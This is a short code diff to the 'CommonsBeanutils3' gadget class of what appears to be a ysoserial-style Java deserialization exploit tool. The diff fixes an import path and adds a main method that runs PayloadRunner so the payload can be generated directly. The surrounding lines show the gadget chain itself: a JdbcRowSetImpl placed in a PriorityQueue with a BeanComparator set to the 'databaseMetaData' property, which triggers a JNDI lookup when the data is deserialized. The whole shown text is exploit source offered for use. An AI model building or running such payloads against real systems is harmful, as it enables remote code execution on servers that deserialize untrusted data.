@@ -1,10 +1,11 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.rowset.JdbcRowSetImpl;
 import org.apache.commons.beanutils.BeanComparator;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.math.BigInteger;
 import java.util.PriorityQueue;
@@ -31,5 +32,9 @@ public class CommonsBeanutils3 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
 		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
 		return queue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsBeanutils3.class, args);
 	}
 }
